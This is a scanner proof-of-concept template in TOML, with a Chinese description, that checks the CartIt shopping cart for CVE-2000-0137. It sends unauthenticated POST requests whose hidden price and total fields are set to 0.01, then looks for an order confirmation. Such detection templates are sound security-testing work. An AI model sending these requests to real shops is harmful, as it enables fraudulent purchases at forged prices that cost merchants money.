[info]
author = "AVE"
description = "检测 CartIt 购物车应用是否存在隐藏表单字段安全绕过漏洞。攻击者通过修改 POST 请求中隐藏字段（如 price、quantity、total）的值，可篡改订单金额实现低价购买。该漏洞无需身份认证，仅需构造特制 HTTP 请求即可利用。"
id = "POC-AVE-2000-0122"
name = "CartIt 购物车隐藏表单字段篡改 PoC"
severity = "high"
tags = [
    "cve-2000-0137",
    "shopping-cart",
    "form-tampering",
]
vuln_id = [
    "CVE-2000-0137",
    "AVE-2000-0122",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cart/update.cgi"
protocol = "http"

[poc.requests.body]
content = "item_id=1&quantity=1&price=0.01&total=0.01"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "total",
    "order total",
    "checkout",
    "subtotal",
]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "0.01",
    "0.00",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cart/order.cgi"
protocol = "http"

[poc.requests.body]
content = "product_id=1&qty=1&price=0.01"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "thank you",
    "order confirmed",
    "order received",
]
